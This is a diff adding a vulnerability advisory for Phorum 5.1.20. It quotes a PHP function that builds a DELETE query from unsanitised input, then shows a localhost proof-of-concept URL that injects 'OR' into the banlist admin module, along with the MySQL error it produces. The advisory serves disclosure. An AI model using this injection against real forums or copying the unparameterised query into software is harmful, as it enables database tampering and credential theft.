@@ -1,0 +1,27 @@
+source: http://www.securityfocus.com/bid/23616/info
+      
+Phorum is prone to multiple input-validation vulnerabilities, including an unauthorized-access issue, privilege-escalation issue, multiple SQL-injection issues, and cross-site scripting issues, because the application fails to sufficiently sanitize user-supplied input.
+      
+Exploiting these issues could allow an attacker to steal cookie-based authentication credentials, compromise the application, access or modify sensitive data, or exploit latent vulnerabilities in the underlying database implementation.
+      
+Phorum 5.1.20 is affected; prior versions may also be vulnerable.
+
+> From source code - "include/db/mysql.php" line 3223:
+--------------------------------------------------
+function phorum_db_del_banitem($banid) {
+    $PHORUM = $GLOBALS["PHORUM"];
+
+    $conn = phorum_db_mysql_connect();
+
+    $sql = "DELETE FROM {$PHORUM['banlist_table']} WHERE id = $banid";
+
+    $res = mysql_query($sql, $conn);
+---------------------------------------------------
+
+PoC: http://localhost/phorum.5.1.20/admin.php?module=banlist&delete=1&curr=OR
+
+... and we will get error message:
+
+<!-- You have an error in your SQL syntax; check the manual that corresponds
+to your MySQL server version for the right syntax to use near
+'OR' at line 1: DELETE FROM phorum_banlists WHERE id = OR -->
